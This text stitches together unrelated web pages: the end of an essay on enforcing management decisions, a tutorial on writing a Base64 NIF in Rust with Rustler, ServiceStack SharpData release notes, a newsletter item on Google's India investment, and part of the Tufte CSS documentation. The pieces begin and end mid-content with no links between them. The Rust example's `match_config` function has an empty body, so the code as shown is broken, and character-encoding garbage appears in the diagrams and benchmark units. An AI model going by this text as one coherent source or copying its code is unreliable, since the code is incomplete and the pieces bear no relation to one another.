even more. Remind people of the decision. Pull out the meeting notes. There will be opposition from many people who had a different opinion. After you’ve made every effort to convince them and take them with you, it’s the managers and founders duty to enforce the decision. </p><p>Because the effects of a decision often cannot be seen immediately, people reopen decisions too early. If there is no new important information, don’t reopen decisions. Stick to them until you clearly see you have to change them. Change decisions as soon as needed but not earlier. Flip flopping decisions creates confusion and frustration.</p><p>Changing a decision is easy and involves not a lot of work. But the more your work is down the execution chain, the bigger the impact. A dog tail wiggles only slightly at its base but furiously at its tip.</p><p>When a decision is not enforced, it leads to …</p></div></div>

<p>Rustler is a fantastic project built to make writing Rust NIFs a simple process;
and the upcoming v0.22 release will provide a much cleaner syntax to do so. The
library handles encoding and decoding Rust values into Erlang terms, catches
Rust panics before they unwind to C and <em>should</em> make it impossible to crash the
BEAM from a Rust NIF.</p>
<h2 id="getting-started-with-rustler">Getting started with Rustler</h2>
<p>One of my first forays into Rust-implemented NIFs was while building a
micro-library providing Base64 encoding and decoding, creatively named
<a href="https://github.com/niklaslong/base64" target="_blank" rel="noopener">base64</a>. It's utterly pointless as that
functionality comes built-in to Elixir but I wanted to start with something
simple. On the plus side, this meant I could easily compare the performance of
the NIF version to the Elixir implementation which can be found in the
<a href="https://hexdocs.pm/elixir/Base.html" target="_blank" rel="noopener"><code>Base</code> module</a>.</p>
<p>The library consists of two functions: <code>encode/2</code> and <code>decode/2</code> and it's using
<a href="https://github.com/marshallpierce/rust-base64" target="_blank" rel="noopener">rust-base64</a> to do the heavy
lifting in the NIFs. Let's walk through how this all works.</p>
<p>To get started, we need a new mix project with rustler installed as a
dependency.</p>
<pre><code>mix new base64

mix deps.get
mix rustler.new
</code></pre><p>Let's explore the project's resulting structure (I've left out the usual Elixir
files and directories and focused on <code>lib</code> and <code>native</code>):</p>
<pre><code>.
â”œâ”€â”€ lib
â”‚   â””â”€â”€ base64.ex
â””â”€â”€ native
    â””â”€â”€ base64_nif
        â”œâ”€â”€ Cargo.lock
        â”œâ”€â”€ Cargo.toml
        â”œâ”€â”€ README.md
        â””â”€â”€ src
            â””â”€â”€ lib.rs</code></pre><ul>
<li><code>lib</code> will contain Elixir code (like any standard mix project).</li>
<li><code>base64.ex</code> will contain the stubs to our NIFs. This is the Elixir module the
NIF module will be registered to.</li>
<li><code>native</code> will be home to the Rust code. In fact, a cargo package has been
created within this directory (in this case named <code>base64_nif</code>).</li>
<li><code>lib.rs</code> will contain the NIFs.</li>
</ul>
<p>The Rust NIFs are compiled and linked into a shared library loaded by Erlang
code at runtime. Elixir (or Erlang) implementations of the functions are also
necessary. These are usually minimal stubs defining the name and arity of the
NIFs and serve as fallback implementations if the NIFs aren't loaded. Let's
start with the Elixir stubs.</p>
<pre><code>

<span><span>defmodule</span> <span>Base64</span></span> <span>do</span>
  <span>use</span> Rustler, <span>otp_app:</span> <span>:base64</span>, <span>crate:</span> <span>"base64_nif"</span>

  <span>@spec</span> decode(binary, atom) :: binary
  <span><span>def</span> <span>decode</span></span>(_b64, _opt \\ <span>:standard</span>), <span>do:</span> error()

  <span>@spec</span> encode(binary, atom) :: binary
  <span><span>def</span> <span>encode</span></span>(_s, _opt \\ <span>:standard</span>), <span>do:</span> error()

  <span><span>defp</span> <span>error</span></span>(), <span>do:</span> <span>:erlang</span>.nif_error(<span>:nif_not_loaded</span>)
<span>end</span></code></pre><p>The first line is configuration and lets Rustler know what Rust crate to compile
for the Elixir module.</p>
<p>As mentioned above, <code>decode/2</code> and <code>encode/2</code> don't actually implement any
decoding or encoding; they simply call <code>error/0</code> if the NIFs can't be found.
However, the names and the arguments must match in both the Rust and Elixir
implementations. Both functions take in a <code>binary</code> to be encoded or decoded and
an <code>atom</code> for configuration as different character sets that can be used
(url-safe, without padding, etc...). The default is fittingly set to
<code>:standard</code>. The Rust NIFs are implemented as follows.</p>
<pre><code>

<span>use</span> base64;
<span>use</span> rustler::Atom;

<span>mod</span> atoms {
    rustler::atoms! {
      crypt,
      imap_map7,
      standard,
      standard_no_pad,
      url_safe,
      url_safe_no_pad,
    }
}

<span>#[rustler::nif]</span>
<span>pub</span> <span><span>fn</span> <span>decode</span></span>(b64: <span>String</span>, opt: Atom) -&gt; <span>String</span> {
    <span>let</span> config: base64::Config = match_config(opt);
    <span>let</span> bytes = base64::decode_config(b64, config).expect(<span>"decode failed: invalid b64"</span>);

    <span>String</span>::from_utf8(bytes).unwrap()
}

<span>#[rustler::nif]</span>
<span>pub</span> <span><span>fn</span> <span>encode</span></span>(s: <span>String</span>, opt: Atom) -&gt; <span>String</span> {
    <span>let</span> config: base64::Config = match_config(opt);
    base64::encode_config(s.as_bytes(), config)
}

<span><span>fn</span> <span>match_config</span></span>(option: Atom) -&gt; base64::Config {
    
}

rustler::init!(<span>"Elixir.Base64"</span>, [decode, encode]);</code></pre><p>The last line is interesting: <code>rustler::init</code> is a procedural macro that allows
the use of <code>#[rustler::nif]</code> to annotate functions to be wrapped as NIFs. It
takes in the name of the Elixir module in which the stubs are defined (in this
case <code>"Elixir.Base64"</code>) and an array containing the names of the functions
annotated as NIFs (in this case <code>[decode, encode]</code>). In short, this links
everything together.</p>
<p>The use statements at the top of the file are importing the
<a href="https://github.com/marshallpierce/rust-base64" target="_blank" rel="noopener">rust-base64 crate</a> (<code>base64</code>)
mentioned earlier, which we'll use for encoding and decoding, and the
<code>rustler::Atom</code> type which allows us to represent an Elixir/Erlang <code>atom</code> in
Rust. Both the <code>rustler</code> and <code>base64</code> crates have been added to the <code>Cargo.toml</code>
dependencies.</p>
<p>The <code>rustler::atoms</code> macro defines Rust functions that return Erlang atoms; in
this case, the possible options for the <code>encode/2</code> and <code>decode/2</code> functions.</p>
<p>Finally, we come to the NIF definitions. The functions take in a <code>String</code> and a
<code>rustler::Atom</code>, and return a <code>String</code>. This is consistent with the Elixir
stubs, as are the names. In this case, the conversions between Rust values and
Elixir terms are conveniently handled by Rustler. However, for more complex
types, this may need to be implemented manually.</p>
<h2 id="how-does-it-compare-to-the-elixir-implementation">How does it compare to the Elixir implementation?</h2>
<p>Rust is fast. Really fast. This was my set-up (using
<a href="https://github.com/bencheeorg/benchee" target="_blank" rel="noopener">benchee</a>):</p>
<pre><code>Operating System: macOS
CPU Information: Intel(R) Core(TM) i5-4258U CPU @ 2.40GHz
Number of Available Cores: 4
Available memory: 16 GB
Elixir 1.10.2
Erlang 22.3.2</code></pre><p>I used <em>hello world</em> as the short string and Sarah Kayâ€™s poem
<em><a href="https://www.youtube.com/watch?v=0snNB1yS3IE" target="_blank" rel="noopener">B (If I Should Have a Daughter)</a></em>
as the longer string.</p>
<p>Decoding:</p>
<pre><code>##### With input Bigger #####
Comparison:                    ips
Rust Nif decode           175.74 K
Elixir/Erlang decode        4.35 K - 40.37x slower +224.03 Î¼s

##### With input Small #####
Comparison:                    ips
Rust Nif decode           953.17 K
Elixir/Erlang decode      555.63 K - 1.72x slower +0.75 Î¼s</code></pre><p>Encoding:</p>
<pre><code>##### With input Bigger #####

Rust Nif encode           203.14 K
Elixir/Erlang encode        6.95 K - 29.23x slower +138.98 Î¼s

##### With input Small #####
Comparison:                    ips
Rust Nif encode           941.14 K
Elixir/Erlang encode      615.62 K - 1.53x slower +0.56 Î¼s</code></pre><p>As the data to encode or decode becomes larger, the overhead of creating the
NIFs becomes smaller and the gains in speed are impressive. These results were
obtained with fairly small data and so the potential performance gains possible
by leveraging Rust NIFs when dealing with CPU-intensive tasks are exciting.</p>
<p>I left out the memory usage comparisons but the Elixir/Erlang implementations
used 3-5x more memory than the NIFs.</p>
<h2 id="tldr-rustler-makes-it-easy-to-implement-nifs">TL;DR: Rustler makes it easy to implement NIFs</h2>
<p>Other than the <code>#[rustler::nif]</code> function annotations and the <code>rustler::init</code>
call, nothing more is required to implement Rust NIFs with Rustler. The
boilerplate and the complexities of translating Rust values to Erlang terms
being handled by the library, there's little resistance to leveraging the power
of Rust in Elixir/Erlang.</p>

<p>It makes use of the <a href="https://docs.servicestack.net/netcore-windows-desktop" rel="nofollow">app</a> dotnet tool for running Chromium
<a href="https://sharpscript.net/sharp-apps/gist-desktop-apps" rel="nofollow">Gist Desktop Apps</a> on-the-fly without installation, from a single URL that can also
<a href="https://docs.servicestack.net/mix-tool" rel="nofollow">mix in additional gists</a> which can be used in SharpData to configure RDBMS's, copy SQLite databases and
apply per-database customizations to add navigable deep links and customized UI Views to each table resultset.</p>
<p>Whilst SharpData supports <a href="https://github.com/ServiceStack/ServiceStack.OrmLite#8-flavours-of-ormlite-is-on-nuget">connecting to most popular RDBMS's</a>, it's
especially useful for being able to deploy an instant stand-alone UI with an embedded SQLite databases which can be published independently in a gist and
launched from a single URL.</p>
<p>For an example of this in action we've published customized gists for the
<a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/linq/downloading-sample-databases" rel="nofollow">Northwind</a> and
<a href="https://www.sqlitetutorial.net/sqlite-sample-database/" rel="nofollow">Chinook</a> SQLite databases which after installing the latest
<a href="https://docs.servicestack.net/netcore-windows-desktop" rel="nofollow">app</a> dotnet tool:</p>
<pre><code>$ dotnet tool install -g app
$ app -version
</code></pre>
<p>First time <code>app</code> is run it registers the <a href="#app-url-schemes">app:// URL scheme</a> allowing Windows x64 Desktop Apps to be launched from URLs:</p>
<ul>
    <li><strong><a name="app://sharpdata?mix=northwind.sharpdata">app://sharpdata?mix=northwind.sharpdata</a></strong></li>
    <li><strong><a name="app://sharpdata?mix=chinook.sharpdata">app://sharpdata?mix=chinook.sharpdata</a></strong></li>

<h4>
Hosted as a .NET Core App</h4>
<p>As <a href="https://github.com/NetCoreApps/SharpData">NetCoreApps/SharpData</a> is also a standard .NET Core project, it can also be deployed as a
normal stand-alone .NET Core Web App:</p>

<h3>
Tiny footprint</h3>
<p>An impressively capable .NET Core App that fits into a tiny <strong>20kb .zip</strong> footprint thanks to <a href="https://sharpscript.net/gist-desktop-apps">Gist Desktop App's Architecture</a>. It's small dynamic <code>#Script</code> &amp; Vue TypeScript code-base also makes it highly customizable to tailor &amp; further extend with
App-specific requirements - suitable for offering advanced system users a quick, capable customized read-only UI of your DBs.</p>
<p><strong>SharpData</strong> started as a demonstration showing how productive <a href="https://sharpscript.net/" rel="nofollow">#Script</a> can be in the number of areas where
dynamic languages offer far superior productivity then the typical .NET approach of using C# to type an entire code-base &amp; models.</p>
<p>For example a single <code>#Script</code> page provides a lot of the functionality in <a href="https://docs.servicestack.net/autoquery-rdbms" rel="nofollow">AutoQuery</a> where it provides an instant HTTP API
(in all registered ServiceStack formats) around all registered RDBMS tables, in all OrmLite supported RBDMS's, that includes support for custom fields,
multiple querying options, paging, multi OrderBy's in a parameterized SQL query executed with OrmLite's SQL async DB APIs:</p>

<h3>
Instant Customizable RDBMS UI</h3>
<p>The <a href="https://github.com/NetCoreApps/SharpData">SharpData</a> project essentially provides a UI around this script, surfacing its features &amp; give
it instant utility which ended up being so useful that it's become the quickest way to perform fast adhoc DB queries as it's easy to configure
which RDBMS's &amp; tables to show in a simple text file, easy to customize its UI, enables 1-click export into Excel and its shortcut syntax
support in column filters is a fast way to perform quick adhoc queries.</p>
<h3>
Quick Tour</h3>
<p>We'll quickly go through some of its features to give you an idea of its capabilities, from the above screenshot we can some of its
filtering capabilities. All results displayed in the UI are queried using the above
<a href="https://github.com/NetCoreApps/SharpData/blob/master/wwwroot/db/_db/_table/index.html">sharpdata</a> <code>#Script</code> HTTP API
which supports the following features:</p>
<h3>
Filters</h3>
<p>All query string parameter except for <code>db,fields,format,skip,take,orderBy</code> are treated as filters, where you can:</p>
<ul>
<li>Use <code>=null</code> or <code>!=null</code> to search <code>NULL</code> columns</li>
<li>Use <code>&lt;=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;&gt;</code>, <code>!=</code> prefix to search with that operator</li>
<li>Use <code>,</code> trailing comma to perform an <code>IN (values)</code> search (integer columns only)</li>
<li>Use <code>%</code> suffix or prefix to perform a <code>LIKE</code> search</li>
<li>Use <code>=</code> prefix to perform a coerced "JS" search, for exact <code>number</code>, <code>boolean</code>, <code>null</code> and WCF date comparisons</li>
<li>Otherwise by default performs a "string equality" search where columns are casted and compared as strings</li>
</ul>
<p>Here's the filtered list used in the above screenshot:</p>
<p><a href="http://sharpdata.netcore.io/db/northwind/Order?format=json&amp;Id=%3E10200&amp;CustomerId=V%25&amp;Freight=%3C%3D30&amp;OrderDate=%3E1997-01-01&amp;take=100" rel="nofollow">/db/northwind/Order?Id=&gt;10200&amp;CustomerId=V%&amp;Freight=&lt;=30&amp;OrderDate=&gt;1997-01-01</a></p>
<h3>
Custom Field Selection</h3>
<p>The <strong>column selection</strong> icon on the top left of the results lets you query custom select columns which is specified using <code>?fields</code>:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json&amp;fields=Id%2CCompanyName%2CContactName%2CContactTitle&amp;take=100" rel="nofollow">/db/northwind/Customer?fields=Id,CompanyName,ContactName,ContactTitle</a></li>
</ul>
<h3>
Multiple OrderBy's</h3>
<p>You can use <a href="https://docs.servicestack.net/autoquery-rdbms#multiple-orderbys" rel="nofollow">AutoQuery Syntax</a> to specify multiple Order By's:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json&amp;orderBy=-Id,CompanyName,-ContactName" rel="nofollow">/db/northwind/Customer?orderBy=-Id,CompanyName,-ContactName</a></li>
</ul>
<h3>
Paging</h3>
<p>Use <code>?skip</code> and <code>?take</code> to page through a result set</p>
<h3>
Format</h3>
<p>Use <code>?format</code> to specify which <strong>Content-Type</strong> to return the results in, e.g:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=html" rel="nofollow">/db/northwind/Customer?format=html</a></li>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json" rel="nofollow">/db/northwind/Customer?format=json</a></li>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=csv" rel="nofollow">/db/northwind/Customer?format=csv</a></li>
</ul>
<h3>
Multitenancy</h3>
<p>You can specify which registered DB to search using the path info, use <code>main</code> to query the default database:</p>
<pre><code>/db/&lt;named-db&gt;/&lt;table&gt;
</code></pre>
<h3>
Open in Excel</h3>
<p>SharpData detects if <strong>Excel</strong> is installed and lets you open the un-paged filtered resultset directly by clicking the <strong>Excel</strong> button</p>
<p><a href="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-excel.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-excel.png" alt=""></a></p>
<p>This works seamlessly as it's able to "by-pass" the browser download where the query is performed by the back-end .NET Core Server who streams the response directly to the Users <strong>Downloads</strong> folder and launches it in Excel as soon as it's finished.</p>
<h3>
Launching SharpData</h3>
<p>To run SharpData in a .NET Core Desktop App you'll need latest <code>app</code> dotnet tool:</p>
<pre><code>$ dotnet tool update -g app
</code></pre>
<blockquote>
<p>If on macOS/Linux you can use the <a href="https://docs.servicestack.net/dotnet-tool" rel="nofollow">x dotnet tool</a> instead to view SharpData in your default browser</p>
</blockquote>
<h3>
Configure RDBMS from command-line</h3>
<p>You can override which database to connect to by specifying it on the command line, e.g. here's an example of connecting to <a href="https://techstacks.io/" rel="nofollow">https://techstacks.io</a> RDBMS:</p>
<pre><code>$ app open sharpdata -db postgres -db.connection $TECHSTACKS_DB
</code></pre>
<p>Which will open SharpData listing all of TechStack's RDBMS tables. If you have a lot of tables the <strong>Sidebar filter</strong> provides a quick way to
find the table you want, e.g:</p>
<p><a href="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-technology.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-technology.png" alt=""></a></p>
<h3>
app URL Schemes</h3>
<p>What can be done with the <code>open</code> command on the command-line can also be done from a <strong>custom URL Scheme</strong>, a feature that opens up a myriad of new
possibilities as <code>app</code> can open <a href="https://sharpscript.net/docs/gist-desktop-apps" rel="nofollow">Gist Desktop Apps</a> from Gists or in public &amp; private GitHub repositories,
where it's able to download and launch Apps on the fly with custom arguments - allowing a single URL to run a <strong>never installed</strong> Desktop App stored in a
Gist &amp; pass it custom params to enable <strong>deep linking</strong>.</p>
<p>With this organizations could maintain a dashboard of links to its different Desktop Apps that anyone can access, especially useful as the
<strong>only software</strong> that's needed to run any <a href="https://sharpscript.net/docs/sharp-apps" rel="nofollow">Sharp Apps</a> is the <code>app</code> dotnet tool which thanks to all
ServiceStack .dll's &amp; dependencies being bundled with the tool, (including Vue/React/Bootstrap fontawesome and Material SVG Icon assets),
the only files that need to be published are the App's specific resources, which is how Apps like <strong>SharpData</strong> can be compressed in a
<strong>20kb .zip</strong> - a tiny payload that's viable to download the latest app each on each run, removing the pain &amp; friction to distribute updates as
everyone's already running the latest version every time it's run.</p>
<p>Should you need to (e.g. large Sharp App or github.com is down) you can run your previously locally cached App using <code>run</code>:</p>
<pre><code>$ app run sharpdata
</code></pre>
<p>With Custom URL Schemes everyone with <code>app</code> installed can view any database they have network access to from specifying the db type and connection string in the URL:</p>
<pre><code>app://sharpdata?db=postgres&amp;db.connection={CONNECTION_STRING}
</code></pre>

                    <p><em>Google just promised to invest $10 Billion in India and we need to talk about it.</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>Yesterday, Google’s CEO, Sundar Pichai had a <a href="https://blog.google/inside-google/company-announcements/investing-in-indias-digital-future">big announcement</a> to make.</p><blockquote>Today, I’m excited to announce the Google for India Digitization Fund. Through this effort, we will invest ₹75,000 crore, or approximately $10 billion, into India over the next 5–7 years. We’ll do this through a mix of equity investments, partnerships, and operational, infrastructure and ecosystem investments. This is a reflection of our confidence in the future of India and its digital economy.</blockquote><p>And truth be told, it’s a big bet. I mean, when was the last time you saw a foreign company commit such an exorbitant sum to the future of India? It’s quite an unprecedented push for India’s digital dreams. And there was a four-point agenda that Google outlined to turn these dreams into reality.</p><p><strong>1) Enabling affordable access and information for every Indian in their own language, whether it’s Hindi, Tamil, Punjabi or any other.</strong></p><p>Explanation: India isn’t a large <a href="https://hbr.org/2017/12/you-dont-need-an-india-strategy-you-need-a-strategy-for-each-state-in-india">homogeneous market</a>. Instead, it’s an amalgamation of multiple micro markets with subtle differences in culture, language, income, tradition, and wealth. So tech companies aspiring to foray deep into these micro-markets will have to adapt to these differences.</p><p>Consider for instance the language divide.</p><p>Back in 2018, India had an <a href="https://www.livemint.com/industry/media/most-of-india-s-digitally-monetizable-users-want-vernacular-content-report-1565097932712.html">active internet user base</a> of 530 Million. However, close to half these users preferred digital content in their own language. And don’t scoff at this population. They come with an annual spending power of $300 billion. That’s a massive market crying out for tailor-made products. You can’t ignore them anymore.</p><p>Unfortunately, building a library rich in vernacular content will take time and money. Just look at the scale of the problem here — <a href="https://qz.com/india/1372074/google-using-ai-for-more-indian-language-content/">90% of the country’s</a> registered 135,000 publications don’t even have a website since they only cater to local communities. And most of them couldn’t scale their business online since they had very limited tools at their disposal.</p><p>In fact, back in 2018, Google said it was working with Indian language publishers to solve this very problem. They introduced <a href="https://navlekha.withgoogle.com/intl/en/#!/overview">Navlekha</a> — a platform that was supposed to allow publishers to edit and produce content in local languages without any expert digital knowledge. And they were just scratching the surface here.</p><p>But if they really wanted to make a dent , they had to have better subtitles, better translation, better content, better accessibility, better everything. They needed to make investments to help grow the vernacular ecosystem.</p><p>And guess what? It’s happening now.</p><p><strong>2) Building new products and services that are deeply relevant to India’s unique needs</strong></p><p>Every market has its own peculiar quirks and India is no different. When Samsung <a href="https://news.samsung.com/global/thinking-local-how-products-are-tailored-to-markets-2">launched its ActivWash+</a> washing machine they added a built-in sink, given the tendency among Indians to pre-wash clothes by hand. This meant consumers no longer had to crouch on the floor and they could hand wash their clothes standing upright. I am not saying Google is trying to build washing machines here. But like most things, tech products are likely to witness a surge in adoption rates if they are built specifically for the audience they cater to.</p><p>In fact, Google is no stranger to this. Back in 2017, they wrote a rather <a href="https://www.blog.google/technology/next-billion-users/building-india-first-products-and-features/">elaborate memo</a> on how they were building India-first products and features for the next billion Internet users.</p><blockquote>Another India-first feature is the new “two-wheeler mode” in Google Maps. India is the largest two-wheeler market in the world, and the millions of motorcycle and scooter riders have different navigation needs than drivers of automobiles. Two-wheeler mode in Maps shows trip routes that use “shortcuts” not accessible to cars and trucks. It also provides customized traffic and arrival time estimations. And since so many Indians rely on local landmarks for navigation, two-wheeler mode will show major landmarks on the route so that riders can plan their trip before starting, and don’t have to keep checking the phone on the go.</blockquote><p>I think it’s pretty clear what Google is trying to do here.</p><p><strong>3) Empowering businesses as they continue or embark on their digital transformation</strong></p><p>Think Google Pay. Currently the <a href="https://www.livemint.com/technology/tech-news/google-pay-set-to-tap-into-12mn-kirana-stores-in-india-1566990709066.html">platform has</a> over 3,000 online merchants and over 200,000 offline merchants. They use it to take payments, pay their suppliers, transfer money to employees and pay the odd electricity bill. And if Google can partner with other similar entities that are trying to help grow India’s fledgling digital ecosystem, it would be a win-win for everyone involved.</p><p>Right?</p><p><strong>4) Leveraging technology and AI for social good, in areas like health, education, and agriculture</strong></p><p>“Don’t be evil” was a part of the company’s <a href="https://abc.xyz/investor/other/google-code-of-conduct.html" rel="noopener noreferrer noopener">corporate code of conduct</a> since 2000. When Google reorganized in 2015, the parent company Alphabet assumed a <a href="https://www.engadget.com/2015/10/02/alphabet-do-the-right-thing/" rel="noopener noreferrer noopener">slightly different version</a> of the motto — “do the right thing.”</p><p>So, point 4 ought to be self-explanatory. It’s literally their motto.</p><p>But do bear in mind, that there is an ulterior motive here. Google wasn’t going to spend this money and push the digitization initiative if it didn’t make business sense. After all, a digital India translates to more people taking to the internet. And since Google makes most of its money offering advertising services online, you can get a sense of why they are making this bet right now.</p><!--kg-card-begin: image--><figure><img src="https://cdn-images-1.medium.com/max/900/1*EuniDplL-G6F5Fs-XOXXjw.jpeg"></figure><!--kg-card-end: image--><p>Nonetheless, that’s it from us today.

      <p>Dave Liepmann</p>
      <section>
        <p>Tufte CSS provides tools to style web articles using the ideas demonstrated by Edward Tufte’s books and handouts. Tufte’s style is known for its simplicity, extensive use of sidenotes, tight integration of graphics with text, and carefully chosen typography.</p>
        <p>Tufte CSS was created by <a href="http://www.daveliepmann.com/">Dave Liepmann</a> and is now an Edward Tufte project. The original idea was cribbed from <a href="https://tufte-latex.github.io/tufte-latex/">Tufte-<span>L<span>a</span>T<span>e</span>X</span></a> and <a href="http://rmarkdown.rstudio.com/tufte_handout_format.html">R Markdown’s Tufte Handout format</a>. We give hearty thanks to all the people who have contributed to those projects.</p>
        <p>If you see anything that Tufte CSS could improve, we welcome your contribution in the form of an issue or pull request on the GitHub project: <a href="https://github.com/edwardtufte/tufte-css">tufte-css</a>. Please note the <a href="https://github.com/edwardtufte/tufte-css#contributing">contribution guidelines</a>.</p>
        <p>Finally, a reminder about the goal of this project. The web is not print. Webpages are not books. Therefore, the goal of Tufte CSS is not to say “websites should look like this interpretation of Tufte’s books” but rather “here are some techniques Tufte developed that we’ve found useful in print; maybe you can find a way to make them useful on the web”. Tufte CSS is merely a sketch of one way to implement this particular set of ideas. It should be a starting point, not a design goal, because any project should present their information as best suits their particular circumstances.</p>
      </section>

      <section>
        <h2 id="getting-started">Getting Started</h2>
        <p>To use Tufte CSS, copy <code>tufte.css</code> and the <code>et-book</code> directory of font files to your project directory, then add the following to your HTML document’s <code>head</code> block:</p>

        <pre><code>&lt;link rel="stylesheet" href="tufte.css"/&gt;</code></pre>

        <p>Now you just have to use the provided CSS rules, and the Tufte CSS conventions described in this document. For best results, View Source and Inspect Element frequently.</p>
      </section>

      <section>
        <h2 id="fundamentals">Fundamentals</h2>
        <h3 id="fundamentals--sections-and-headers">Sections and Headings</h3>
        <p>Organize your document with an <code>article</code> element inside your <code>body</code> tag. Inside that, use <code>section</code> tags around each logical grouping of text and headings.</p>
        <p>Tufte CSS uses <code>h1</code> for the document title, <code>p</code> with class <code>subtitle</code> for the document subtitle, <code>h2</code> for section headings, and <code>h3</code> for low-level headings. More specific headings are not supported. If you feel the urge to reach for a heading of level 4 or greater, consider redesigning your document:</p>
        <blockquote cite="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000hB">
          <p>[It is] notable that the Feynman lectures (3 volumes) write about all of physics in 1800 pages, using only 2 levels of hierarchical headings: chapters and A-level heads in the text. It also uses the methodology of <em>sentences</em> which then cumulate sequentially into <em>paragraphs</em>, rather than the grunts of bullet points. Undergraduate Caltech physics is very complicated material, but it didn’t require an elaborate hierarchy to organize.</p>
          
        </blockquote>
        <p>As a bonus, this excerpt regarding the use of headings provides an example of block quotes. In Tufte CSS they are just lightly styled, semantically correct HTML using <code>blockquote</code> and <code>footer</code> elements. See page 20 of <a href="https://www.edwardtufte.com/tufte/books_vdqi">The Visual Display of Quantitative Information</a> for an example in print.</p>
        <p><span>In his later books<label for="sn-in-his-later-books"></label></span><span><a href="http://www.edwardtufte.com/tufte/books_be"><em>Beautiful Evidence</em></a></span>, Tufte starts each section with a bit of vertical space, a non-indented paragraph, and the first few words of the sentence set in small caps. For this we use a span with the class <code>newthought</code>, as demonstrated at the beginning of this paragraph. Vertical spacing is accomplished separately through <code>&lt;section&gt;</code> tags. Be consistent: though we do so in this paragraph for the purpose of demonstration, do not alternate use of header elements and the <code>newthought</code> technique. Pick one approach and stick to it.</p>

        <h3 id="fundamentals--text">Text</h3>
        <p>Although paper handouts obviously have a pure white background, the web is better served by the use of slightly off-white and off-black colors. Tufte CSS uses <code>#fffff8</code> and <code>#111111</code> because they are nearly indistinguishable from their ‘pure’ cousins, but dial down the harsh contrast. We stick to the greyscale for text, reserving color for specific, careful use in figures and images.</p>
        <p>In print, Tufte has used the proprietary Monotype Bembo<label for="sn-proprietary-monotype-bembo"></label><span>See Tufte’s comment in the <a href="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000Vt">Tufte book fonts</a> thread.</span> font. A similar effect is achieved in digital formats with the now open-source <a href="https://github.com/edwardtufte/et-book">ETBook</a>, which Tufte CSS supplies with a <code>@font-face</code> reference to a .ttf file. In case ETBook somehow doesn’t work, Tufte CSS shifts gracefully to other serif fonts like Palatino and Georgia.</p>
        <p>Also notice how Tufte CSS includes separate font files for bold (strong) and italic (emphasis), instead of relying on the browser to mechanically transform the text. This is typographic best practice.</p>
        <p>If you prefer sans-serifs, use the <code>sans</code> class. It relies on Gill Sans, Tufte’s sans-serif font of choice.</p>
        <p>Links in Tufte CSS match the body text in color and do not change on mouseover or when clicked. Here is a <a href="#">dummy example</a> that goes nowhere. These links are underlined, since this is the most widely recognized indicator of clickable text. <label for="mn-blue-links">⊕</label><span>Blue text, while also a widely recognizable clickable-text indicator, is crass and distracting. Luckily, it is also rendered unnecessary by the use of underlining.</span> However, because most browsers’ default underlining does not clear descenders and is so thick and distracting, the underline effect is instead achieved using CSS trickery involving background gradients instead of standard <code>text-decoration</code>. Credit goes to Adam Schwartz for that technique.</p>
        <p>As always, these design choices are merely one approach that Tufte CSS provides by default. Other approaches can also be made to work. The goal is to make sentences readable without interference from links, as well as to make links immediately identifiable even by casual web users.</p>
      </section>

      <section>
        <h2 id="epigraphs">Epigraphs</h2>
        <div>
          <blockquote>
            <p>The English language . . . becomes ugly and inaccurate because our thoughts are foolish, but the slovenliness of our language makes it easier for us to have foolish thoughts.</p>
            
          </blockquote>
          <blockquote>
            <p>For a successful technology, reality must take precedence over public relations, for Nature cannot be fooled.</p>
            
          </blockquote>
          <blockquote>I do not paint things, I paint only the differences between things.</blockquote>
        </div>
        <p>If you’d like to introduce your page or a section of your page with some quotes, use epigraphs. Modeled after chapter epigraphs in Tufte’s books (particularly <em>Beautiful Evidence</em>), these are <code>blockquote</code> elements with a bit of specialized styling. Quoted text is italicized. The source goes in a <code>footer</code> element inside the <code>blockquote</code>. We have provided three examples in the epigraph of this section, demonstrating shorter and longer quotes, with and without a paragraph tag, and showing how multiple quotes within an epigraph fit together with the use of a wrapper class.</p>
      </section>

      <section>
        <h2 id="sidenotes">Sidenotes: Footnotes and Marginal Notes</h2>
        <p>One of the most distinctive features of Tufte’s style is his extensive use of sidenotes.<label for="sn-extensive-use-of-sidenotes"></label><span>This is a sidenote.</span> Sidenotes are like footnotes, except they don’t force the reader to jump their eye to the bottom of the page, but instead display off to the side in the margin. Perhaps you have noticed their use in this document already. You are very astute.</p>
        <p>Sidenotes are a great example of the web not being like print. On sufficiently large viewports, Tufte CSS uses the margin for sidenotes, margin notes, and small figures. On smaller viewports, elements that would go in the margin are hidden until the user toggles them into view. The goal is to present related but not necessary information such as asides or citations <em>as close as possible</em> to the text that references them. At the same time, this secondary information should stay out of the way of the eye, not interfering with the progression of ideas in the main text.</p>
        <p>Sidenotes consist of two elements: a superscript reference number that goes inline with the text, and a sidenote with content. To add the former, just put a label and dummy checkbox into the text where you want the reference to go, like so:</p>
        <pre><code>&lt;label for="sn-demo"
       class="margin-toggle sidenote-number"&gt;
&lt;/label&gt;
&lt;input type="checkbox"
       id="sn-demo"
       class="margin-toggle"/&gt;</code></pre>
        <p>You must manually assign a reference <code>id</code> to each side or margin note, replacing “sn-demo” in the <code>for</code> and the <code>id</code> attribute values with an appropriate descriptor. It is useful to use prefixes like <code>sn-</code> for sidenotes and <code>mn-</code> for margin notes.</p>
        <p>Immediately adjacent to that sidenote reference in the main text goes the sidenote content itself, in a <code>span</code> with class <code>sidenote</code>. This tag is also inserted directly in the middle of the body text, but is either pushed into the margin or hidden by default. Make sure to position your sidenotes correctly by keeping the sidenote-number label close to the sidenote itself.</p>
